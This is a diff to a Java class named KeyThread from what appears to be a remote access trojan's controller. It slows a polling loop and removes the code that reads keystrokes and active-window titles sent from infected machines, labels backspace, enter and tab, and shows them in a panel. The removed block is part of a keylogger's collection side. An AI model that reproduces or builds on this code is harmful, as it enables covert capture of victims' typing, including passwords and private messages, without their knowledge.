@@ -23,41 +23,12 @@ public class KeyThread implements Runnable {
 	public void run() {
 		while (enabled) {
 			try {
-				Thread.sleep(1000L);
+				Thread.sleep(5000L);
 
 				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
 					@Override
 					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
-						int len = dis.readInt();
-						System.out.println("Length: " + len);
 						
-						for (int i = 0; i < len; i++) {
-							boolean isKey = dis.readBoolean();
-
-							if (isKey) {
-								char ckey = dis.readChar();
-
-								String key = Character.toString(ckey);
-
-								if (ckey == '\b') {
-									key = "[BACKSPACE]";
-								} else if (ckey == '\n' || ckey == '\r') {
-									key = "[ENTER]\n\r";
-								} else if (ckey == '\t') {
-									key = "[TAB]\t";
-								}
-
-								if (panel != null) {
-									panel.append(key);
-								}
-							} else {
-								String title = dis.readUTF();
-
-								if (panel != null) {
-									panel.append("[Window: " + title + "]");
-								}
-							}
-						}
 					}
 				});
 
